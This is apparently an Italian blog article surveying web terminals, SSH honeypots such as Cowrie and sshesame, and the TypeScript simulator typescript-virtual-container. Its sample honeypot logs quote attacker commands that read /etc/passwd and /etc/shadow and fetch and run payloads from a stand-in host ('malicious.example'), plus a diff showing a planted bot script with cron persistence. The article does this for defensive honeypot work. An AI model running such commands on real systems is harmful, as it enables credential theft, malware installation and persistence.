xterm.js è solo il livello di rendering. Non esegue una shell. Non interpreta comandi. È un widget di visualizzazione che colleghi a qualsiasi backend tu voglia. Molte persone pensano che xterm.js "faccia il terminale" ma in realtà è solo lo schermo -- devi comunque collegarlo a qualcosa che esegue effettivamente i comandi.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- Spawn PTY

`node-pty` spawna uno pseudoterminale (PTY) in Node.js e ti dà un handle di lettura/scrittura. Usato con xterm.js, ti permette di costruire un terminale browser che parla con una shell reale (bash, zsh, fish) in esecuzione sul server.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Send to browser xterm.js via WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Forward browser keystrokes to shell
  shell.write(data);
});
```

Questo è lo schema standard per cloud IDE e terminali web: xterm.js (browser) ↔ WebSocket ↔ node-pty ↔ bash reale. Nessun isolamento. La shell viene eseguita con tutti i permessi del processo Node.js (o dell'utente che lo esegue).

**Mantenuto da**: Microsoft.  
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Parte 4 -- Honeypot SSH

Gli honeypot sono progettati per essere attaccati. L'obiettivo è sembrare abbastanza reali che gli attaccanti interagiscano con loro, registrando tutto ciò che fanno per intelligence sulle minacce. SSH è il bersaglio principale perché è il servizio più attaccato su internet -- se esponi la porta 22 su un IP pubblico, vedrai tentativi di scansione automatica nel giro di pochi minuti. Provaci qualche volta, è piuttosto inquietante quanto velocemente accada.

La qualità di un honeypot si misura con due cose: **fedeltà** (quanto convincentemente finge di essere un sistema reale) e **telemetria** (quanti dati utili cattura). Queste sono in tensione. Un honeypot ad alta fedeltà è più difficile da costruire e più rischioso da operare.

Questa sezione è ciò che alla fine mi ha portato a costruire il modulo `HoneyPot` in `typescript-virtual-container`, quindi ho qualche opinione qui.

### 4.1 Cowrie -- lo standard aureo

Cowrie è un honeypot SSH e Telnet a interazione medio-alta basato su Python. È l'honeypot SSH più ampiamente distribuito nella comunità della ricerca e sicurezza.

Architettura:
- **Livello protocollo**: implementazione reale del protocollo SSH (Twisted Conch), quindi gli attaccanti ottengono handshake reali, scambio di chiavi reale, autenticazione reale
- **Livello shell**: un filesystem finto (simile a Debian 5.0) e un interprete di shell parziale che risponde ai comandi comuni
- **Modalità proxy**: può inoltrare a un sistema reale dietro di esso (modalità ad alta interazione), registrando tutto ciò che passa
- **Modalità LLM** (aggiunta recente): usa un modello linguistico per generare risposte dinamiche a comandi che non sa gestire -- sì, Cowrie ora ha una modalità AI. Tempi selvaggi.

```python
# What Cowrie captures
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie salva i file scaricati (tramite wget/curl/SFTP/SCP) per l'analisi del malware. Si integra con Splunk, Elasticsearch e altre piattaforme SIEM.

**Fedeltà**: medio-alta. Abbastanza convincente da ingannare i bot automatici (che è il 99% degli attaccanti SSH -- la maggior parte sono solo stupidi script che provano `root`/`password`). Gli umani sofisticati possono comunque fingerprintarlo, di solito abbastanza rapidamente.

**Linguaggio**: Python (Twisted)  
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- il predecessore di Cowrie

Kippo è l'honeypot SSH a interazione media originale su cui si basava Cowrie. Stessa idea di base: vero protocollo SSH, filesystem finto, shell parziale. Cowrie lo ha completamente sostituito a questo punto -- Kippo è archiviato e nessuno dovrebbe usarlo nel 2026. Menzionato qui puramente per completezza storica, dato che potresti vederlo citato in vecchi post del blog e articoli di sicurezza.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- archiviato

---

### 4.3 endlessh -- il tarpit SSH

endlessh è un honeypot degenerato: mantiene le connessioni SSH aperte gocciolando lentamente dati del banner a 1 byte al secondo (o più lentamente). Un client SSH che si connette rimarrà in sospeso indefinitamente -- non arriverà mai all'autenticazione perché il server non finisce mai di inviare il banner.

L'obiettivo non è l'intelligence sulle minacce ma la pura negazione di risorse: bloccare i thread di scansione degli attaccanti così non possono colpire bersagli reali altrettanto velocemente. È onestamente piuttosto malvagio nel miglior modo possibile. Non impari nulla dall'attaccante -- stai solo sprecando il loro tempo. C'è qualcosa di profondamente soddisfacente in questo.

```c
// endlessh's entire protocol behavior:
// Send: "SSH-2.0-OpenSSH_" then slowly append random chars
// Never close the connection
// Attacker scanner times out after N seconds
```

Nessun comando viene catturato. Nessuna autenticazione viene testata. Solo tempo di connessione.

**Scritto in**: C  
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- l'honeypot "fai entrare tutti"

sshesame accetta ogni connessione SSH (qualsiasi username, qualsiasi password, qualsiasi chiave) e registra tutto. È un honeypot a interazione zero: non risponde ai comandi, lascia semplicemente "entrare" gli attaccanti e registra ogni tasto che digitano.

```
2024-01-15 03:22:11 Connection from 45.33.32.156
  Username: root, Password: password123 -- accepted
  Commands typed:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Disconnected after 47s
```

Utile per la raccolta di credenziali: accumuli rapidamente gli username e le password che i bot provano, il che ti dice quali credenziali predefinite vengono attivamente brute-forzate. Spoiler: è sempre `root`/`password`, `admin`/`admin` e `root`/`123456`. Ogni volta.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- Framework honeypot basato su Docker

`lyrebird/honeypot-base` è un'immagine Docker base per costruire honeypot di servizi di rete. Non è uno specifico honeypot SSH -- è un framework per costruire honeypot per qualsiasi protocollo.

L'immagine base fornisce un framework di logging, un sistema di plugin per i protocolli e configurazioni Docker Compose per honeypot multi-servizio. La estendi per fingere servizi specifici.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Costruire un honeypot SSH in Node.js -- il modo ingenuo, e perché fallisce

Prima di `typescript-virtual-container`, costruire un honeypot SSH in Node.js significava combinare la vera libreria `ssh2` con la falsificazione manuale dei comandi. Molto tedioso, molto incompleto, ma tipo... è un rito di passaggio a questo punto:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Log the attempt
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Let everyone in
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Fake response
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Questo "funziona" nel senso che cattura credenziali e comandi. Ma è ovviamente falso nel momento in cui un attaccante sofisticato ci prova. `uname -a` restituisce la stringa giusta ma `ls /etc` restituisce "command not found" è un giveaway. Il filesystem non esiste. I comandi non si incatenano. Le pipe non funzionano. Le variabili non si espandono.

Un attaccante esperto fingerprinterà il tuo honeypot nei primi cinque comandi. Anche gli script automatizzati che cercano comportamenti simili a Cowrie lo rileveranno immediatamente. Questo è apparentemente ciò che ha spinto l'autrice di `typescript-virtual-container` verso la costruzione di qualcosa che interpreta effettivamente i comandi per davvero -- più su questo nella Parte 5.

---

### Riepilogo della famiglia honeypot

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | ssh2 ingenuo |
|---|---|---|---|---|---|---|
| **Livello interazione** | medio-alto | medio | zero | zero | variabile | basso |
| **Protocollo SSH reale** | ✅ | ✅ | ❌ (tarpit) | ✅ | variabile | ✅ |
| **Fedeltà shell** | media | media | n/a | nessuna | variabile | minima |
| **Cattura credenziali** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Cattura comandi** | ✅ | ✅ | ❌ | ✅ | variabile | ✅ |
| **Cattura malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Integrazione SIEM** | ✅ nativa | ❌ | ❌ | ❌ | ❌ | manuale |
| **Risposte LLM** | ✅ (nuovo) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Linguaggio** | Python | Python | C | Go | Docker | Node.js |
| **Node.js nativo** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Stato** | ✅ molto attivo | ⚠️ archiviato | ✅ attivo | ✅ attivo | ✅ attivo | Fai da te |

Il modello qui è piuttosto chiaro: più fedeltà vuoi, più Python devi scrivere. Cowrie è il chiaro vincitore se stai facendo questo seriamente -- è stato testato sul campo per anni e cattura molto più delle sole credenziali. endlessh e sshesame sono progetti divertenti più che strumenti seri di threat intelligence. E l'approccio Node.js ingenuo ti porta forse al 20% del percorso prima di colpire un muro.

---

## Parte 5 -- `typescript-virtual-container`: cosa colma il divario

OK, quindi qui è dove le cose diventano interessanti. Dopo aver catalogato tutte le famiglie di cui sopra, il quadrante mancante diventa piuttosto ovvio:

- Sandbox JS: isolano codice, niente shell, niente filesystem, niente SSH
- Emulatori Linux: vero OS, vera shell, vero SSH... ma 150+ MB RAM, 30 secondi di avvio, e devi costruire la tua API sopra I/O seriale
- Honeypot: shell finta, nessuna API programmatica, Python/Go/C, non Node-nativo

Nessuno aveva costruito un ambiente Linux completo, programmatico, Node-nativo con vero SSH, veri permessi, vera rete virtuale e un'API TypeScript tipizzata. Quindi lei l'ha costruito.

Breve introduzione dato che è la prima volta che la menziono propriamente: `typescript-virtual-container` è stato costruito da [Chloé Rolzhausen](https://itsrealfortune.fr), una sviluppatrice francese che si fa chiamare **Fortune** (o ItsRealFortune) online. Puoi trovarla sul suo [sito web](https://itsrealfortune.fr) e su [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316//). L'intero progetto -- 56k righe di TypeScript, 247 file, 170 comandi -- è stato uno sforzo solitario di una singola persona. La chiamerò Fortune per il resto dell'articolo. E sì, è piuttosto pazzesco. Dai un'occhiata alle sue cose!

### Cosa è realmente

`typescript-virtual-container` è un **simulatore di ambiente Linux** scritto in puro TypeScript. Niente Wasm. Niente addon nativi. Niente kernel. ~56.000 righe di codice sorgente in 247 file TypeScript.

L'intuizione chiave: non hai bisogno di un emulatore CPU per far funzionare `ls /etc | grep passwd`. Hai bisogno di:
1. Un albero di nodi in memoria che rispondono a operazioni sui percorsi
2. Un modello di permessi POSIX imposto su ogni accesso
3. Un parser di shell che capisca pipeline, redirezioni, subshell ed espansione di variabili
4. ~170 implementazioni di comandi (funzioni, non binari)
5. Un sistema di gestione utenti e gruppi
6. Qualcosa per esporre tutto questo via SSH

Tutto questo è realizzabile in puro TypeScript senza coinvolgimento del kernel.

### Il VirtualFileSystem

Il VFS è un albero in memoria di nodi tipizzati -- nessun I/O su disco a meno che non abiliti esplicitamente la modalità di persistenza `"fs"`:

```ts
// Simplified internal representation
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // lazy-loaded placeholder
```

Ogni operazione sui percorsi passa attraverso `normalizePath` (risolve `.`, `..`, symlink) e `enforceAccess` (controlla i permessi di lettura/scrittura/esecuzione rispetto all'uid/gid richiedente). `chmod`, `chown`, sticky bit e setuid sono tutti implementati e realmente imposti. Se un processo in esecuzione come uid 1000 tenta di leggere un file di proprietà di root con modalità 0600, ottiene EACCES -- non un finto EACCES, un vero `Error` JavaScript lanciato dal controllo dei permessi. Quella parte è piuttosto elegante onestamente.

Il VFS si serializza in:
- `.vfsb` -- un formato binario compatto (personalizzato, con compressione fflate) -- questo è il predefinito
- Snapshot JSON -- leggibile dall'umano, buono per il debug
- Archivio TAR -- import/export con vero formato tar, quindi puoi `tar -xf` qualcosa e il VFS ha... quei file
- Immagine SquashFS -- import di sola lettura

In modalità di persistenza `"fs"`, mantiene un journal write-ahead (WAL) per il recupero da crash -- le scritture vanno prima al journal, poi allo snapshot durante il flush. Se Node si blocca a metà operazione, il journal ti permette di ricostruire l'ultimo stato completo.

C'è anche un livello `FileCache` che simula la latenza I/O del disco. Configuri profili come `NVME_DISK_IO` o `HDD_DISK_IO` e il VFS ritarda artificialmente le operazioni sui file per corrispondere a tempistiche realistiche. Il che è piuttosto divertente -- software che si rallenta intenzionalmente per simulare hardware -- ma in realtà molto utile per il benchmarking.

### L'interprete di shell

Il parser di shell produce un AST tipizzato:

```ts
// "ls /etc | grep root && echo done" parses to:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

L'esecutore percorre questo AST:
- Per una pipeline, crea una catena di stream `{ stdin, stdout, stderr }` ed esegue ogni comando con I/O pipe
- Per operatori logici (`&&`, `||`), controlla `$?` dopo il lato sinistro prima di eseguire il destro
- Per subshell (`$(...)`, `` ` ` ``), forkia il contesto di esecuzione
- Per redirezioni (`>file`, `>>file`, `2>&1`, `<file`), imposta il wiring degli stream prima dell'esecuzione
- Per job in background (`cmd &`), esegue senza attendere il completamento
- Per variabili, espande `$VAR`, `${VAR:-default}`, `${#VAR}`, e aritmetica `$((expr))`
- Per espansione di parentesi (`{a,b,c}`, `{1..5}`), genera la lista di espansione completa prima di eseguire

Tutto questo è vero comportamento POSIX della shell. Il parser gestisce heredoc, sostituzione di processo, globbing (`*`, `?`, `[abc]`) e gestione delle virgolette (virgolette singole, virgolette doppie con interpolazione, escaping con backslash). Non è perfetto -- esistono casi limite -- ma è molto oltre ciò che ti aspetteresti da un progetto TypeScript.

### ~170 comandi integrati

I comandi sono funzioni TypeScript registrate in un registro comandi. Ricevono un `CommandContext` con stream stdin/stdout/stderr, il VFS, la sessione utente, l'ambiente della shell e l'accesso a sottomoduli.

Scrivere 170 implementazioni di comandi Unix è... un sacco. Alcuni sono banali (`echo`, `true`, `false`), alcuni sono sorprendentemente complessi (`awk`, `find`, `tar`). Tipo, un vero `awk` POSIX? In TypeScript? È pazzesco onestamente. Ecco un campione di ciò che c'è:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (client-side, connecting out),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (full interactive editor), vim (basic), vi (basic),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulated), systemctl (stubbed), journalctl (stubbed),
...and ~130 more
```

Gli "stub" (git, python3, node) rispondono realisticamente a invocazioni comuni -- `python3 --version` restituisce una stringa di versione credibile, `git status` mostra uno stato del repo finto -- senza fare lavoro reale. Per un honeypot, questi sono in realtà più utili delle cose reali, perché ti permettono di osservare cosa gli attaccanti cercano di eseguire senza effettivamente eseguire nulla di dannoso.

### Il server SSH

Il livello SSH usa il vero pacchetto npm `ssh2` -- vero protocollo SSH, vero scambio di chiavi, vera crittografia. `SSHMimic` lo avvolge:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Real SSH: ssh -p 2222 root@localhost
// Real SFTP: sftp -P 2222 root@localhost
// Real SCP: scp -P 2222 file root@localhost:/tmp/
```

Le `shellProperties` determinano cosa riportano `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` e `/etc/os-release`. Puoi impersonare qualsiasi distribuzione Linux e versione del kernel in modo convincente -- per un vero client SSH non c'è letteralmente modo di notare la differenza.

### Il modulo HoneyPot

Poiché l'interprete della shell è reale e il server SSH è reale, i comandi degli attaccanti vengono effettivamente eseguiti nell'ambiente virtuale. Le richieste `wget` attivate dall'attaccante vengono registrate con gli URL di destinazione. I file creati dall'attaccante vengono salvati nel VFS. I tentativi di escalation dei permessi dell'attaccante producono errori realistici.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// After a session, diff the filesystem
const before = shell.vfs.toSnapshot();
// ... attacker session ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Questo è qualitativamente diverso da Cowrie. Il filesystem finto di Cowrie può rispondere a `ls` ma non può effettivamente tracciare quali file un attaccante ha creato e quali modifiche ha apportato come diff strutturato. `typescript-virtual-container` può farlo, perché il VFS è una struttura dati viva -- ogni scrittura è tracciata. Quella voce cron che l'attaccante ha appena aggiunto? È nel diff. Quella cartella `.hidden`? Nel diff. Abbastanza utile per l'analisi del malware.

### Lo stack di rete virtuale

Questa è probabilmente la parte più impressionante dell'intero progetto, e non ha equivalenti in nessun altro progetto in questo spazio. Tipo, una piena rete virtuale L2/L3 con supporto VPN, scritta in puro TypeScript, senza coinvolgere adattatori di rete reali. È genuinamente pazzesco.

`VirtualNetworkManager` dà a ogni istanza `VirtualShell` interfacce di rete virtuali con indirizzi IP configurabili, tabelle di routing e un firewall software (regole in stile iptables con conntrack e NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` mostrano tutti lo stato della rete virtuale.

`VirtualSwitch` (chiamato Baie -- dalla parola francese per un rack di server, "baie informatique") collega più shell su una subnet condivisa. Implementa:
- Apprendimento MAC e ARP
- Routing IP tra subnet
- NAT (masquerade in uscita)
- DNS (record configurabili per subnet)
- Bilanciamento del carico (round-robin, least-connections)
- Traffic shaping: latenza, jitter (distribuzione gaussiana), perdita di pacchetti, burst loss, riordinamento, duplicazione
- Limitazione della larghezza di banda (token bucket)
- Imposizione MTU
- Tracciamento delle connessioni (stateful, con stati NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Three virtual machines on the same switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: web can reach api, api can reach db, web cannot reach db directly
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Traffic shaping: simulate a flaky WAN link to the outside
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` crea tunnel crittografati tra istanze Baie -- puoi simulare una rete multi-sito con interconnessioni VPN tra siti.

`VirtualProxy` implementa port forwarding e un proxy SOCKS5.

Niente di tutto questo tocca un adattatore di rete reale. È tutto routing di oggetti TypeScript. Il comando `ping` "funziona" instradando attraverso lo switch virtuale e restituendo risposte ICMP simulate. `curl http://192.168.0.3/api` instrada attraverso la rete virtuale, colpisce la risposta HTTP simulata della shell api e restituisce il contenuto. Sono tartarughe fino in fondo, nel miglior modo possibile.

### La `SandboxedShell`

Per uso programmatico dove hai bisogno di un isolamento più forte, `SandboxedShell` esegue una sessione shell in un Node.js Worker thread:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% of one core
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

L'isolamento qui è imposto dal livello VFS (la shell del worker thread può vedere solo il filesystem virtuale, mai il filesystem host) più l'isolamento della memoria del Worker thread Node.js. Questo è più leggero di `isolated-vm` ma più appropriato per l'isolamento a livello di shell piuttosto che per l'isolamento a livello JS.

### Limitazione delle risorse

Puoi configurare limiti di risorse per shell che influenzano ciò che i comandi di monitoraggio del sistema riportano:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

All'interno di quella shell, `free -m` mostra 512 MB di RAM totale. `nproc` restituisce 2. `/proc/meminfo` mostra i valori limitati. `htop` e `top` mostrano il numero di CPU limitato. Questo ti permette di fingerprintare il profilo hardware della macchina finta con precisione.

### Tre modalità di deploy

```
Modalità 1: Server SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Vero protocollo SSH, vero SFTP, vero SCP
  → Caso d'uso: honeypot, ambienti di test remoti, laboratori di formazione

Modalità 2: Web shell (browser)
  builds/fortune-nyx-v1.7.6-web.min.js (bundle ESM)
  → Funziona nel browser, VFS persistito in IndexedDB
  → Caso d'uso: tutorial interattivi, terminali incorporati, demo
  → Bonus: esegui startxfce4 per un desktop XFCE simulato completo

Modalità 3: CLI standalone
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (file singolo, nessuna installazione)
  → curl ed esegui, persiste VFS in directory .vfs/
  → Caso d'uso: demo rapide, sperimentazione locale
```

### I polyfill -- come funziona il build browser senza Wasm

OK, questa è la parte che trovo genuinamente intelligente e volevo evidenziare specificamente.

Far funzionare una libreria Node.js nel browser è di solito un incubo. O usi un runtime Wasm (pesante, lento da caricare) o passi settimane a sostituire manualmente ogni import `node:*` con un'alternativa compatibile con il browser. Fortune ha fatto la seconda cosa -- ma molto pulitamente, scrivendo un set di polyfill personalizzati che vivono nella directory `polyfills/` del repository.

La pipeline di build è semplicemente esbuild con un mucchio di alias:

```js
// demo/build.js -- the entire browser build config
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Niente Wasm. Nessuna libreria polyfill esterna. Nessuna assurdità `webpack-node-externals`. Solo moduli aliasati e un paio di globali iniettati. Lascia che li analizzi uno per uno perché alcuni sono genuinamente impressionanti.

**`node:fs` -- IndexedDB come filesystem finto**

Questo è il mio preferito. Il polyfill `node:fs` implementa l'API fs sincrona di Node.js (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) supportata da due livelli: una `Map` in memoria per le letture sincrone e IndexedDB per la persistenza tra ricariche di pagina. Le scritture colpiscono la Map immediatamente (quindi `readFileSync` subito dopo `writeFileSync` funziona sempre), poi vengono scaricate in IndexedDB in modo asincrono in background.

```js
// Sync cache (path → Uint8Array | null) -- instant reads
const memCache = new Map();

// Preload everything from IndexedDB into memCache at startup
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Questa è la ragione per cui lo snapshot VFS sopravvive alle ricariche di pagina nel browser -- l'intero binario `.vfsb` viene scritto in IndexedDB tramite questo polyfill e riletto al caricamento successivo. Nessun Wasm. Nessun server. Solo IndexedDB, che è in ogni browser da circa il 2011.

**`node:crypto` -- SHA-256 in puro JS**

Invece di tirare dentro una libreria crittografica Wasm, il polyfill crypto implementa SHA-256 da zero usando le costanti di round FIPS 180-4. 166 righe di puro JS con supporto completo per output hex/base64/Uint8Array. Tutto l'hashing nella libreria passa attraverso questo -- fingerprinting della chiave host SSH, checksum interni, tutto. Compatto, zero dipendenze, semplicemente funziona.

**`node:os` -- legge l'hardware reale del browser**

Questo è un bel tocco. Invece di restituire valori fittizi, `node:os` legge `navigator.deviceMemory` per la RAM totale e `navigator.hardwareConcurrency` per il conteggio CPU. Quindi `neofetch` all'interno del build browser riporta effettivamente qualcosa che corrisponde alla tua macchina reale -- non uno stub inventato `2 core, 2GB RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB fallback
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // also parses navigator.userAgent to guess the CPU model string
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- stub onesti**

Il browser non può aprire socket TCP o eseguire vero SSH, quindi questi sono stub che lanciano un errore `NotImplemented` con un messaggio chiaro se qualcosa cerca di usarli. Nessun fallimento silenzioso, nessun `undefined` restituito dove ci si aspetta un oggetto. Solo un forte e chiaro "questo non funziona nel browser" -- che è esattamente ciò che vuoi.

**`process.js` e `buffer.js` -- globali iniettati**

Questi due sono iniettati all'inizio di ogni file bundled tramite l'opzione `inject` di esbuild, quindi `process` e `Buffer` sono disponibili globalmente senza alcun import esplicito. `process.js` è minuscolo: `env`, `version`, `platform: 'browser'`, `nextTick` tramite `queueMicrotask`, `uptime` tramite `performance.now()`. `buffer.js` è una piena reimplementazione di `Buffer` sopra `Uint8Array` -- tutti i metodi `readUInt32BE`, `writeInt16LE`, codifica hex/base64 da cui dipendono l'implementazione SSH e il VFS.

---

L'intero set di polyfill è circa 640 righe di JS scritto a mano in totale. Nessun pacchetto npm. Nessun Wasm. E il risultato è un bundle browser che è solo la libreria, funzionante nativamente, con nessuna della solita ansia "ma funziona davvero nel browser?" che si ha con le librerie Node-first. Vale uno sguardo alla cartella `polyfills/` nel repository se sei curioso -- ogni file è ben contenuto e leggibile da solo, che è una scelta di stile che apprezzo molto.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Categoria** | Sandbox JS | Sandbox JS | Sandbox JS | Emulatore | Emulatore | Node.js/Wasm | Honeypot | Simulatore |
| **Isola JS** | ⚠️ scope | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | parziale | n/a | ✅ Worker |
| **Kernel Linux reale** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Interprete shell** | ❌ | ❌ | ❌ | ✅ (reale) | ✅ (reale) | ✅ (reale) | parziale | ✅ (custom) |
| **~170 comandi Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | parziale | ~20 | ✅ |
| **Permessi POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | parziale | ✅ imposti |
| **Gestione utenti** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimale | ✅ completo |
| **Server SSH reale** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/snapshot VFS** | ❌ | ❌ | ❌ | limitato | ❌ | ❌ | ❌ | ✅ |
| **Rete virtuale L2/L3** | ❌ | ❌ | ❌ | base | ❌ | ❌ | ❌ | ✅ completo |
| **VPN virtuale** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Supporto browser** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js nativo** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API tipizzata** | base | ✅ | ✅ | minimale | ❌ | ✅ | ❌ | ✅ completo |
| **Compatibilità binaria** | n/a | n/a | n/a | ✅ | ✅ | parziale | n/a | ❌ |
